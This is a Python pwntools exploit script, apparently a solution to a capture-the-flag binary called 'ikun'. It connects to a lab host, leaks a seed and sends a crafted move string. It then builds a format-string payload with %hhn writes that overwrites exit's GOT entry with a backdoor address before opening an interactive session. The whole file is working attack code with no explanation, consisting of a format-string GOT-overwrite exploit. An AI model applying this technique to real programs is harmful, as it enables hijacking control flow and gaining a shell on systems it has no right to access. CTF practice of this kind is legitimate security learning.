from pwn import *
import binascii
context.log_level = 'debug'
# p=process('./ikun')
p=remote('10.81.2.235',12922)
libc=ELF('./libc-2.27.so')
# gdb.attach(p)
pause()
p.recvuntil(b'please enter your name first: \n')
p.send(b'kunqqqqqqqqq')
p.recvuntil(b'kunqqqqqqqqq')
seed=p.recv(4)
print("my seed",u32(seed))
moves=input("输入动作")
# 判断moves第100个字符是不是c，如果是c就改成t，如果不是就改成c
# new_s='cctlrctcttlttcrlcrrllrcrtrllctrltlrlclctclrrlctlllrrtrcrcltcccltlttlttctcllllcrrlcccrcrlcclcclrlclltcllcrrlrltcrtt'
if moves[99]=='c':
    new_s = moves[:99] + 't' + moves[100:]
else:
    new_s = moves[:99] + 'c' + moves[100:]
# for i in range(114):
#     p.recvuntil(b'Guess the movement KunKun will do:(c/t/r/l)\n')
#     p.sendline(new_s[i].encode())
p.send(new_s.encode())
p.recvuntil(b'> ')
# p.interactive()

backdoor=0x0000000000400951
print('backdoor',hex(backdoor))
print(backdoor%256,backdoor//256%256)
one=backdoor%256
two=backdoor//256%256-one
three=backdoor//256//256%256-one-two
if two<0:
    two=256+two
if three<0:
    three=256+three
print(one,two,three)
# di12个参数
# payload=(b'%'+bytes(str(one), encoding='utf-8')+b'c%17$hhn%'+bytes(str(two), encoding='utf-8')+b'c%18$hhn%'+bytes(str(three), encoding='utf-8')+b'c%21$hhn%').ljust(40,b'k')+p64(system_got)+p64(system_got+1)+p64(0)+p64(0)+p64(system_got+2)
exit_got=0x602070
payload=(b'%'+bytes(str(one), encoding='utf-8')+b'c%17$hhn%'+bytes(str(two), encoding='utf-8')+b'c%18$hhn%'+bytes(str(three), encoding='utf-8')+b'c%21$hhn%').ljust(40,b'k')+p64(exit_got)+p64(exit_got+1)+p64(0)+p64(0)+p64(exit_got+2)

# payload=(b'%'+bytes(str(one), encoding='utf-8')+b'c%15$hhn%').rjust(24,b'k')+p64(system_got)
print('payload',payload)
# gdb.attach(p,'b *0x0000000000400964')
pause()
# p.interactive()
p.sendline(payload)
# p.recvuntil(b'kk')

p.interactive()